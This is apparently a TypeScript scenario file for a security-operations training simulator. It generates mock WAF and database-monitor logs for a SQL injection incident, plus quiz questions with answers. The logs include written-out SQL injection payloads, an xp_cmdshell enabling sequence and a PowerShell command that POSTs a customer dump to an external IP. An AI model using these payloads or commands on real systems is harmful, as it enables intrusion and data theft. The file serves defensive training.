/**
 * Scenario pack: "SQL Injection to Database Exfiltration — Following the Attack Past the WAF"
 *
 * ADVANCED tier. An internet-facing storefront (shop.nexacorp.com) is hit with
 * SQL injection against its product-search endpoint. The whole teaching point is
 * that a WAF alert alone UNDERSTATES the incident: the WAF is the first tripwire,
 * but the truth of what happened is written one layer deeper, in the database
 * activity monitor.
 *
 * The arc follows the attack THROUGH the WAF and INTO the database:
 *   1. Imperva WAF blocks a boolean-based probe (' OR 1=1) with a 403 — the rule
 *      that is in BLOCKING mode does its job.
 *   2. The very next payloads — a UNION SELECT against information_schema and an
 *      error-based CONVERT() extraction — sail through with HTTP 200, because the
 *      rules that would catch them sit in a STAGING policy running in DETECTION
 *      (count) mode: they alert but do not block. This is the crux the student
 *      must see: "the WAF logged it" is not "the WAF stopped it".
 *   3. At the database layer, IBM Guardium (DAM) records the same injection
 *      arriving on the web app's own DB login (app_shop, from WEB-APP-02) — an
 *      error-based enumeration that leaks a table name in a CONVERT error, then a
 *      UNION dump of INFORMATION_SCHEMA, then the payoff: a bulk
 *      `SELECT ... FROM dbo.Customers` returning 248,915 rows of PII. Microsoft
 *      SQL Server's own audit corroborates that same SELECT and its response_rows.
 *   4. Because app_shop is (mis)configured as sysadmin, the operator flips
 *      xp_cmdshell on via sp_configure and reaches OS command execution, then uses
 *      it to POST the staged customer dump to an external host.
 *
 * BENIGN CONTROL (evt 0): a scheduled Power BI gateway service account running a
 * parameterized aggregate SELECT that returns 184,920 rows from a reporting view.
 * Same "big database read" shape as the exfil — large rows_returned — but
 * authorized, scheduled, parameterized, and against a reporting view, not the
 * live PII table. The discriminator is never "a lot of rows came back"; it is WHO,
 * from WHERE, WHICH object, and WHETHER the query is parameterized.
 *
 * SOURCES (registry keys): imperva-waf (the WAF injection detections — blocked vs
 * detection-mode passthrough), ibm-guardium (database activity monitoring — the
 * enumeration, the bulk PII read, xp_cmdshell), microsoft-sql-audit (one native
 * SQL Server audit event corroborating the bulk SELECT). NO EDR/SIEM here — the
 * story is deliberately WAF↔DB.
 *
 * NOTE: register in scenarios.ts with difficulty "advanced". The ScenarioBundle
 * itself carries no difficulty field.
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildSqliDbExfilScenario(
  scenarioId = "sqli-db-exfil-2026",
): ScenarioBundle {
  const B = new Date("2026-07-14T22:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One incident — the injection, the DB reads and the OS-command exfil are one case.
  const INCIDENT = "inc:sqli:1";

  // The internet-facing storefront and its tiers.
  const app = { host: "shop.nexacorp.com", webTier: "WEB-APP-02", webTierIp: "10.30.4.15" };
  const dbInstance = "MSSQL-SHOP-01";

  // The attacker's external address — seen at the WAF (upstream of the app).
  const attackerIp = "203.0.113.47";
  // The external endpoint the staged customer dump is POSTed to via xp_cmdshell.
  const exfilIp = "45.83.192.11";

  // The web application's own DB login. It is (mis)configured as sysadmin, which
  // is what later lets the injection enable and drive xp_cmdshell.
  const dbLogin = "app_shop";

  // The Power BI gateway service account — the benign control's high-volume read.
  const biAccount = "svc_powerbi";

  // The staged CSV of customer records the operator exfiltrates.
  const dumpHash = makeSha256("sqli_db_exfil_customers_dump_csv_2026");

  const events: TelemetryEvent[] = [
    // ─────────────────────────────────────────────────────────────────────
    // 0. BENIGN CONTROL — a scheduled BI aggregate read. Big rows_returned,
    //    but a service account, parameterized, against a reporting view.
    //    Same "large database read" shape as the exfil; opposite verdict.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_00_benign_bi_read",
      ts: "2026-07-14T03:00:12Z",
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      severity: "informational",
      expected_verdict: "fp",
      description:
        "The Power BI enterprise gateway service account svc_powerbi ran the nightly 03:00 revenue-summary aggregate on SalesDW, a parameterized GROUP BY over the reporting view vw_DailyRevenueSummary, returning 184,920 rows.",
      fp_explanation:
        "This is the control case for the whole scenario, and it looks alarming for exactly one reason: a very large rows_returned (184,920). Every other attribute clears it. The db.user is svc_powerbi, a Power BI gateway service account whose job is bulk reporting reads; it runs on schedule at 03:00 every night; the query is parameterized (@from / @to bind variables, no literal string concatenation); and it targets a reporting VIEW (vw_DailyRevenueSummary), not the live customer PII table. The exfil read later in the timeline shares only the row count — it comes from the web app's login, is unparameterized, and pulls dbo.Customers directly. Students who alert on 'a query returned a lot of rows' alone will flag this and be wrong: the discriminator is who, from where, which object, and whether it is parameterized.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "success",
        "db.user": biAccount,
        "db.user.role": "db_datareader",
        "database.name": "SalesDW",
        "database.instance": "MSSQL-RPT-01\\RPT",
        "database.table": "vw_DailyRevenueSummary",
        "query.type": "SELECT",
        "query.text":
          "SELECT Region, SUM(NetAmount) AS Revenue, COUNT(*) AS Orders FROM dbo.vw_DailyRevenueSummary WHERE OrderDate >= @from AND OrderDate < @to GROUP BY Region",
        "query.rows_returned": "184920",
        "query.rows_affected": "0",
        "query.duration": "41213",
        "query.status": "success",
        "sql.command": "SELECT",
        "application.name": "Microsoft.PowerBI.EnterpriseGateway",
        "authentication.method": "kerberos",
        "source.ip": "10.30.9.22",
        "source.hostname": "RPT-GW-02",
        "db.session.id": "72",
        "session.start": "2026-07-14T03:00:12Z",
        "host.name": dbInstance,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 1. WAF — a boolean-based probe is BLOCKED. The blocking policy works.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_01_waf_blocked_probe",
      ts: T(0),
      source: "waf",
      vendor: "Imperva WAF",
      event_type: "waf_block",
      hostname: app.host,
      src_ip: attackerIp,
      severity: "medium",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "Imperva blocked a GET to /product/search from 203.0.113.47 whose q parameter carried a boolean tautology (' OR 1=1). The request was answered with HTTP 403 by the production OWASP policy.",
      raw: {
        "event.category": "web",
        "event.action": "sql_injection_detected",
        "event.outcome": "failure",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.as.organization.name": "M247 Europe SRL",
        "destination.hostname": app.host,
        "http.request.method": "GET",
        "url.path": "/product/search",
        "url.query": "q=laptop' OR 1=1-- -",
        "url.full": "https://shop.nexacorp.com/product/search?q=laptop' OR 1=1-- -",
        "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
        "http.response.status_code": "403",
        "waf.attack.type": "SQL Injection",
        "waf.attack.score": "95",
        "waf.rule.id": "942100",
        "waf.rule.name": "SQL Injection Attack Detected via libinjection",
        "waf.policy.name": "OWASP-CRS-Production",
        "rule.category": "OWASP CRS",
        "action_result": "blocked",
        "threat.signature": "SQLi:942100",
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 2. WAF — a UNION SELECT reaches the origin (HTTP 200). The rule fires
    //    but only ALERTS: it lives in a staging policy running in detection
    //    (count) mode, so the malicious request is passed to the app.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_02_waf_union_passthrough",
      ts: T(3 * MIN),
      source: "waf",
      vendor: "Imperva WAF",
      event_type: "waf_allow",
      hostname: app.host,
      src_ip: attackerIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "A UNION SELECT against information_schema.tables from 203.0.113.47 matched an Imperva signature but was recorded with action_result=alerted and forwarded to the origin, which answered HTTP 200 — the matching rule sits in a staging policy running in detection mode.",
      raw: {
        "event.category": "web",
        "event.action": "sql_injection_detected",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.as.organization.name": "M247 Europe SRL",
        "destination.hostname": app.host,
        "http.request.method": "GET",
        "url.path": "/product/search",
        "url.query": "q=laptop' UNION SELECT null,table_name,null FROM information_schema.tables-- -",
        "url.full":
          "https://shop.nexacorp.com/product/search?q=laptop' UNION SELECT null,table_name,null FROM information_schema.tables-- -",
        "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
        "http.response.status_code": "200",
        "waf.attack.type": "SQL Injection",
        "waf.attack.score": "88",
        "waf.rule.id": "942190",
        "waf.rule.name": "Detects MSSQL code execution and information gathering attempts",
        "waf.policy.name": "OWASP-CRS-Staging",
        "rule.category": "OWASP CRS",
        "action_result": "alerted",
        "threat.signature": "SQLi:942190",
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 3. WAF — an error-based CONVERT() extraction also passes through (200).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_03_waf_errorbased_passthrough",
      ts: T(5 * MIN),
      source: "waf",
      vendor: "Imperva WAF",
      event_type: "waf_allow",
      hostname: app.host,
      src_ip: attackerIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "An error-based payload — 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables)) — from 203.0.113.47 was again alerted-only under the staging policy and forwarded to the origin (HTTP 200).",
      raw: {
        "event.category": "web",
        "event.action": "sql_injection_detected",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.as.organization.name": "M247 Europe SRL",
        "destination.hostname": app.host,
        "http.request.method": "GET",
        "url.path": "/product/search",
        "url.query":
          "q=laptop' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -",
        "http.request.body": "",
        "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
        "http.response.status_code": "200",
        "waf.attack.type": "SQL Injection",
        "waf.attack.score": "84",
        "waf.rule.id": "942260",
        "waf.rule.name": "Detects basic SQL authentication bypass / extraction attempts",
        "waf.policy.name": "OWASP-CRS-Staging",
        "rule.category": "OWASP CRS",
        "action_result": "alerted",
        "threat.signature": "SQLi:942260",
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 4. DB — the error-based payload arrives at the database on the app's own
    //    login. A CONVERT() failure leaks a table name in the error message.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_04_db_errorbased_enum",
      ts: T(5 * MIN + 4 * SEC),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "Guardium recorded the injected CONVERT() extraction reaching ShopDB on login app_shop from the web tier WEB-APP-02. The statement failed with SQL error 245, and the conversion error text returned the name of a table.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "failure",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "ShopDB",
        "database.instance": dbInstance,
        "query.type": "SELECT",
        "query.text":
          "SELECT id,name,price FROM Products WHERE name LIKE '%laptop' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -%'",
        "query.status": "error",
        "sql.command": "SELECT",
        "sql.error.code": "245",
        "sql.error.message":
          "Conversion failed when converting the nvarchar value 'Customers' to data type int.",
        "application.name": ".Net SqlClient Data Provider",
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 5. DB — a UNION dump of INFORMATION_SCHEMA.COLUMNS succeeds: the operator
    //    now has the full column map (schema enumeration).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_05_db_union_schema",
      ts: T(6 * MIN),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "A UNION SELECT appended to the product query returned 612 rows from INFORMATION_SCHEMA.COLUMNS on login app_shop — a full table-and-column map of ShopDB.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "success",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "ShopDB",
        "database.instance": dbInstance,
        "database.table": "INFORMATION_SCHEMA.COLUMNS",
        "query.type": "SELECT",
        "query.text":
          "SELECT id,name,price FROM Products WHERE name LIKE '%' UNION SELECT TABLE_NAME,COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS-- -%'",
        "query.rows_returned": "612",
        "query.status": "success",
        "sql.command": "SELECT",
        "application.name": ".Net SqlClient Data Provider",
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 6. DB — THE PAYOFF. A bulk SELECT of the customer PII table returns
    //    248,915 rows on the app login. This is the data actually leaving.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_06_db_bulk_pii_dump",
      ts: T(8 * MIN),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "critical",
      mitre_technique: "T1213",
      mitre_tactic: "Collection",
      incident_id: INCIDENT,
      description:
        "Guardium recorded an unparameterized SELECT of dbo.Customers on login app_shop returning 248,915 rows, including email, password hashes and card-last-four columns, with 41.5 MB moved in the session.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "success",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "ShopDB",
        "database.instance": dbInstance,
        "database.table": "dbo.Customers",
        "database.column": "Email,PasswordHash,CardLast4",
        "query.type": "SELECT",
        "query.text":
          "SELECT CustomerId,FullName,Email,Phone,PasswordHash,CardLast4,BillingAddress FROM dbo.Customers",
        "query.rows_returned": "248915",
        "query.rows_affected": "0",
        "query.duration": "88342",
        "query.status": "success",
        "sql.command": "SELECT",
        "application.name": ".Net SqlClient Data Provider",
        "session.bytes": "41560320",
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1213",
        "threat.technique.name": "Data from Information Repositories",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 7. DB (native) — SQL Server's own audit corroborates the same bulk
    //    SELECT and its response_rows. Read straight off the .sqlaudit file.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_07_mssql_audit_dump",
      ts: T(8 * MIN + 1 * SEC),
      source: "db_monitor",
      vendor: "Microsoft SQL Server Audit",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "critical",
      mitre_technique: "T1213",
      mitre_tactic: "Collection",
      incident_id: INCIDENT,
      description:
        "SQL Server's native audit logged the same statement as a SELECT (action_id SL) on dbo.Customers by principal app_shop from client 10.30.4.15, succeeded=true, response_rows 248,915 — an independent record of the read at the engine.",
      raw: {
        "event_time": T(8 * MIN + 1 * SEC),
        "sequence_number": "1",
        "action_id": "SL",
        "succeeded": "true",
        "class_type": "U",
        "server_principal_name": dbLogin,
        "database_principal_name": "dbo",
        "server_instance_name": dbInstance,
        "database_name": "ShopDB",
        "schema_name": "dbo",
        "object_name": "Customers",
        "statement":
          "SELECT CustomerId,FullName,Email,Phone,PasswordHash,CardLast4,BillingAddress FROM dbo.Customers",
        "client_ip": app.webTierIp,
        "application_name": ".Net SqlClient Data Provider",
        "host_name": app.webTier,
        "response_rows": "248915",
        "affected_rows": "0",
        "duration_milliseconds": "88342",
        "session_id": "88",
        "audit_file_offset": "512000",
        "file_name": "ShopDB_Audit_0A3F.sqlaudit",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 8. DB — xp_cmdshell is enabled via sp_configure (possible because the
    //    app login holds sysadmin), and used to run an OS command.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_08_xpcmdshell_exec",
      ts: T(11 * MIN),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "privileged_operation",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "critical",
      mitre_technique: "T1059",
      mitre_tactic: "Execution",
      incident_id: INCIDENT,
      description:
        "On login app_shop (role sysadmin), sp_configure turned on 'xp_cmdshell', then EXEC master..xp_cmdshell 'whoami' ran cmd.exe on the database host and returned the SQL Server service account — OS command execution reached from the injection.",
      process: {
        name: "cmd.exe",
        pid: 6120,
        path: "C:\\Windows\\System32\\cmd.exe",
        parent_name: "sqlservr.exe",
        parent_pid: 4408,
        cmdline: "cmd.exe /c whoami",
        user: "NT Service\\MSSQLSERVER",
      },
      raw: {
        "event.category": "database",
        "event.action": "stored_procedure_exec",
        "event.outcome": "success",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "master",
        "database.instance": dbInstance,
        "query.type": "EXEC",
        "query.text":
          "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'",
        "sql.command": "EXEC",
        "sql.procedure": "xp_cmdshell",
        "process.name": "cmd.exe",
        "process.command_line": "cmd.exe /c whoami",
        "host.os.name": "Windows Server 2019",
        "host.name": dbInstance,
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "threat.technique.id": "T1059",
        "threat.technique.name": "Command and Scripting Interpreter",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 9. DB — the staged customer dump is POSTed off-box via xp_cmdshell to an
    //    external host. Exfiltration over a web request.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_09_xpcmdshell_exfil",
      ts: T(13 * MIN),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "privileged_operation",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      dst_ip: exfilIp,
      dst_port: 80,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1567",
      mitre_tactic: "Exfiltration",
      incident_id: INCIDENT,
      description:
        "xp_cmdshell launched powershell to POST C:\\Windows\\Temp\\c.csv — a staged export of the customer table — to http://45.83.192.11/u, sending the collected records off the database host.",
      process: {
        name: "powershell.exe",
        pid: 6340,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "cmd.exe",
        parent_pid: 6120,
        cmdline:
          "powershell -c Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv",
        user: "NT Service\\MSSQLSERVER",
      },
      file: {
        name: "c.csv",
        path: "C:\\Windows\\Temp\\c.csv",
        sha256: dumpHash,
      },
      raw: {
        "event.category": "database",
        "event.action": "stored_procedure_exec",
        "event.outcome": "success",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "master",
        "database.instance": dbInstance,
        "query.type": "EXEC",
        "query.text":
          "EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'",
        "sql.command": "EXEC",
        "sql.procedure": "xp_cmdshell",
        "process.name": "powershell.exe",
        "process.command_line":
          "powershell -c Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv",
        "file.name": "c.csv",
        "file.path": "C:\\Windows\\Temp\\c.csv",
        "file.hash.sha256": dumpHash,
        "destination.ip": exfilIp,
        "destination.port": "80",
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1567",
        "threat.technique.name": "Exfiltration Over Web Service",
      },
    },
  ];

  const iocs: IOC[] = [
    {
      type: "ip",
      value: attackerIp, // 203.0.113.47 — the injection source seen at the WAF
      first_seen: T(0),
      last_seen: T(5 * MIN),
      reputation: "malicious",
      tags: ["external", "attacker-origin", "web-scanner"],
    },
    {
      type: "ip",
      value: exfilIp, // 45.83.192.11 — the outbound POST target
      first_seen: T(13 * MIN),
      last_seen: T(13 * MIN),
      reputation: "malicious",
      tags: ["external", "outbound-http-endpoint"],
    },
    {
      type: "host",
      value: app.host, // shop.nexacorp.com — the targeted storefront
      first_seen: T(0),
      last_seen: T(13 * MIN),
      reputation: "unknown",
      tags: ["internet-facing", "web-app", "victim"],
    },
    {
      type: "user",
      value: dbLogin, // app_shop — the over-privileged DB login the injection rides
      first_seen: T(5 * MIN),
      last_seen: T(13 * MIN),
      reputation: "suspicious",
      tags: ["db-login", "over-privileged", "sysadmin"],
    },
    {
      type: "sha256",
      value: dumpHash, // the staged customer CSV that was POSTed off-box
      first_seen: T(13 * MIN),
      last_seen: T(13 * MIN),
      reputation: "malicious",
      tags: ["staged-dump", "customer-records"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "sqli_q1",
      xp: 55,
      kind: "single",
      prompt:
        "The WAF blocked the ' OR 1=1 probe (sqli_01) with a 403, yet the very next UNION SELECT (sqli_02) came back HTTP 200 from the origin. What does the pair of WAF records actually tell you?",
      hint: "Compare action_result and http.response.status_code across the two events, and read the waf.policy.name on each.",
      options: [
        { value: "detect_mode", label: "The UNION rule matched but only alerted (action_result=alerted) under a staging policy in detection mode, so the request was passed to the app and executed" },
        { value: "waf_down", label: "The WAF crashed between the two requests, so the second payload hit the origin with no inspection at all" },
        { value: "encoded", label: "The second payload was URL-encoded, so the WAF could not decode it and let it through unseen" },
        { value: "200_blocked", label: "An HTTP 200 from a WAF means the request was sanitized and neutralized before reaching the database" },
      ],
      answer: "detect_mode",
      explanation:
        "Both requests were seen and matched by Imperva — the difference is the enforcement mode. sqli_01 is action_result=blocked under OWASP-CRS-Production (403, request stopped). sqli_02 is action_result=alerted under OWASP-CRS-Staging with http.response.status_code=200: a rule in detection/count mode logs the match but forwards the request to the origin, which executed it. 'The WAF logged it' is not 'the WAF stopped it'. The WAF never crashed (it produced a normal alert record). The payload was not encoded away — the plaintext UNION SELECT is right there in url.query. And a 200 is the origin's own response to a request the WAF let through, not proof of sanitization.",
    },
    {
      id: "sqli_q2",
      xp: 70,
      kind: "single",
      prompt:
        "You are writing the incident up. A WAF SQLi alert on its own would be scored as an attempt. Which evidence proves customer data actually left the database rather than the injection merely being tried?",
      hint: "Look for a successful read of a real data table, with a row count and an independent corroboration.",
      options: [
        { value: "bulk_select", label: "sqli_06 / sqli_07 — a successful SELECT of dbo.Customers returning 248,915 rows, corroborated by SQL Server's own audit response_rows for the same statement" },
        { value: "union_schema", label: "sqli_05 — the UNION query against INFORMATION_SCHEMA.COLUMNS that mapped the tables and columns of the database" },
        { value: "waf_alert", label: "sqli_02 — the Imperva alert on the UNION SELECT, which is the record that first flagged the injection to the SOC" },
        { value: "convert_err", label: "sqli_04 — the CONVERT() error whose message leaked the name of the Customers table to the caller" },
      ],
      answer: "bulk_select",
      explanation:
        "Data leaving is a successful read of real rows, not a probe. sqli_06 is a query.status=success SELECT of dbo.Customers with query.rows_returned=248915 (email, password hashes, card-last-four columns) and 41.5 MB of session.bytes, and sqli_07 is SQL Server's native audit of the identical statement with response_rows=248915 and succeeded=true — two independent records of the same bulk read. The UNION against INFORMATION_SCHEMA only enumerated the schema (structure, not customer rows). The WAF alert is what started the investigation but says nothing about what the query returned. And the CONVERT() error leaked a single table name, not the data itself.",
    },
    {
      id: "sqli_q3",
      xp: 65,
      kind: "single",
      prompt:
        "In every database event the db.user is app_shop from WEB-APP-02 (10.30.4.15), never the attacker's 203.0.113.47. How should that shape how you read the DAM logs?",
      hint: "Think about where SQL injection executes and whose session it borrows once it reaches the database.",
      options: [
        { value: "rides_app", label: "The injection runs inside the web app's own DB session, so DAM sees app_shop from the app tier; the true origin is upstream and must be tied in from the WAF and app logs" },
        { value: "insider", label: "app_shop is a rogue database administrator logging in locally, so this is an insider incident and the WAF events are unrelated noise" },
        { value: "db_exposed", label: "The database is directly exposed to the internet, so 10.30.4.15 must be a NAT address for the attacker connecting straight to the DB" },
        { value: "spoofed", label: "The attacker spoofed the source IP to 10.30.4.15 inside the SQL packets to hide behind the application server" },
      ],
      answer: "rides_app",
      explanation:
        "SQL injection executes through the vulnerable application, so the database sees the application's connection: db.user=app_shop, source WEB-APP-02 / 10.30.4.15, application '.Net SqlClient Data Provider'. The attacker's 203.0.113.47 never appears at the DB tier — it is upstream at the WAF. That is the whole reason DAM alone understates the source: you correlate by query content and timing across the WAF and app logs to place the real origin. app_shop is the application's service login, not a human DBA (no local interactive login exists). The DB is not internet-exposed — it is reached via the app. And a DAM source IP is the TCP peer (the app server), not a value the attacker can spoof through the injected string.",
    },
    {
      id: "sqli_q4",
      xp: 75,
      kind: "single",
      prompt:
        "sqli_08 shows sp_configure enabling 'xp_cmdshell' followed by EXEC master..xp_cmdshell 'whoami' succeeding. What did the operator gain, and what made it possible?",
      hint: "Note the db.user.role on the login and what xp_cmdshell does when it runs.",
      options: [
        { value: "os_exec", label: "OS command execution on the database host as the SQL Server service account — possible because app_shop held the sysadmin role, letting it turn xp_cmdshell on and call it" },
        { value: "sqli_only", label: "Nothing beyond the earlier injection — xp_cmdshell just returns query results, so it is another way to read tables, not code execution" },
        { value: "priv_esc_win", label: "Local administrator on Windows via a kernel exploit triggered by the RECONFIGURE statement rebuilding the service token" },
        { value: "new_login", label: "A new SQL login with sysadmin rights, created by sp_configure, which is what then allowed the whoami to run" },
      ],
      answer: "os_exec",
      explanation:
        "xp_cmdshell runs an operating-system command from inside SQL Server, in the context of the SQL Server service account — here cmd.exe /c whoami executes on MSSQL-SHOP-01 (T1059, Execution). Enabling it requires sysadmin, and the log shows exactly that: db.user.role=sysadmin on app_shop, so the injection could run sp_configure to switch xp_cmdshell on and then call it. That an internet-facing app's DB login is sysadmin is the underlying misconfiguration. xp_cmdshell is not a table read — it is command execution. No kernel exploit is present; RECONFIGURE simply applies the sp_configure change. And sp_configure toggles server options, it does not create logins.",
    },
    {
      id: "sqli_q5",
      xp: 85,
      kind: "single",
      prompt:
        "You are scoping containment. Injection reached the DB through a detection-mode WAF rule, 248,915 customer records were read and POSTed to 45.83.192.11, and the app login is sysadmin. Which response matches the evidence?",
      hint: "Address the passthrough, the over-privilege, the OS-command path, the egress, and the confirmed data loss — not just the source IP.",
      options: [
        { value: "full_scope", label: "Move the Imperva SQLi rules to blocking, strip sysadmin from app_shop and rotate its credentials, disable xp_cmdshell, block and hunt egress to 45.83.192.11, and treat the Customers PII as breached for notification" },
        { value: "block_src", label: "Block 203.0.113.47 at the WAF — cutting the source address stops any further injection and closes the incident" },
        { value: "reimage_web", label: "Reimage WEB-APP-02 only — the injection came through the web tier, so rebuilding it removes the vulnerability and ends the exposure" },
        { value: "reset_bi", label: "Reset the svc_powerbi account and revoke its reporting access, since the large customer read came from the same high-volume query pattern it uses" },
      ],
      answer: "full_scope",
      explanation:
        "The evidence names each fix. The injection succeeded because the matching WAF rules were in detection mode, so they must go to blocking. app_shop being sysadmin is what enabled xp_cmdshell, so remove the role and rotate the credential, and disable xp_cmdshell. The dump was POSTed to 45.83.192.11, so block that egress and hunt for what else reached it. And because 248,915 real customer records (with password hashes and card-last-four) were successfully read and sent off-box, the PII must be handled as a confirmed breach for notification. Blocking only 203.0.113.47 leaves the detection-mode gap, the sysadmin login and xp_cmdshell in place for the next source. Reimaging the web server does not fix an over-privileged DB login or the WAF policy. And svc_powerbi is the benign control — a scheduled parameterized reporting read against a view — not the exfil path.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "SQL Injection to Database Exfiltration — Following the Attack Past the WAF",
    threat_actor: "External web attacker automating SQL injection against a public storefront",
    attack_kind: "sql_injection",
    briefing:
      "Imperva flagged SQL-injection activity against shop.nexacorp.com's /product/search endpoint from 203.0.113.47 late on 14 Jul — one request blocked with a 403, others answered 200 by the origin. The DB team also see unusual reads on ShopDB. Work out whether anything got past the WAF, what the database actually did, and how much data is at risk.",
    narrative: `shop.nexacorp.com is Nexacorp's internet-facing storefront, fronted by an Imperva WAF. Just before 22:40 an attacker at 203.0.113.47 began probing the product-search endpoint with automated SQL injection. The first payload — a classic ' OR 1=1 tautology — was caught cleanly: Imperva's production OWASP policy blocked it and returned HTTP 403. On a WAF dashboard alone the story could have ended there, as a blocked attempt.

It did not. The next two payloads — a UNION SELECT against information_schema.tables and an error-based CONVERT() extraction — matched Imperva signatures too, but those rules were sitting in a STAGING policy running in detection (count) mode. They alerted and then forwarded the requests to the origin, which answered HTTP 200. The malicious queries executed. This is the crux of the exercise: "the WAF logged it" is not "the WAF stopped it".

At the database, IBM Guardium recorded the injection arriving on the web application's own DB login, app_shop, from the web tier WEB-APP-02 — the attacker's own address never reaches the DB, because injection runs inside the app's session. First an error-based CONVERT() failed with SQL error 245 and leaked a table name ('Customers') in its error text. Then a UNION dumped 612 rows from INFORMATION_SCHEMA.COLUMNS, mapping the schema. Then the payoff: an unparameterized SELECT of dbo.Customers returned 248,915 rows — email, password hashes, card-last-four — moving 41.5 MB in the session. SQL Server's own native audit independently logged the same statement with response_rows 248,915.

